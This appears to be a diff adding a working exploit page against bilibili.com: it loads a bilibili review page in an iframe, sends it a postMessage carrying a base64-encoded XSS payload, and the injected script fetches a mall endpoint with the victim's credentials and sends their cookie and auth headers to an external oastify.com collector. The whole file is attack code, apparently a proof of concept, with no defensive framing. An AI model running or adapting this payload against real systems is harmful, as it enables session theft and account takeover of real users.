@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>攻击站点</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<h1>Exp页面</h1>
+
+<body> <iframe id="target"></iframe>
+  <script>
+    // ===== 注入到 www.bilibili.com 源内执行的 JS（纯 ASCII，避免 atob 编码问题）=====
+  function buildInjectedJS() {
+
+    return `(async () => {
+  const r = await fetch('https://mall.bilibili.com/mall-dayu/mall-trade-data/blind/order/prevention',
+                        {credentials: 'include', mode: 'cors'});
+  const j = await r.json();
+  const h = j.$detail.request.header;
+  navigator.sendBeacon('https://2psstytqxk6aq5usq2n6u94x2o8fw6quf.oastify.com/collect',
+    JSON.stringify({cookie: h.Cookie, auth: h['X-Bili-Metadata-Auth'], mid: h['X-Auth-Mid']}));
+})();`;
+  }
+
+  function buildPayload() {
+    // ASCII -> base64 -> <img src=x onerror="...eval(atob('...'))">
+    var js = buildInjectedJS();
+    var b64 = btoa(js);
+    return '<img src=x onerror="window.__xss=1;window.__dom=document.domain;eval(atob(\'' + b64 + '\'))">';
+  }
+
+  var PAYLOAD = buildPayload();
+    var target = document.getElementById("target");
+    target.addEventListener('load', () => {
+      target.contentWindow.postMessage({"cvid":"1","newHtml":PAYLOAD},'*')
+    })
+    target.src = "https://www.bilibili.com/h5/note-app/review"
+  </script>
+</body>
+
+</html>
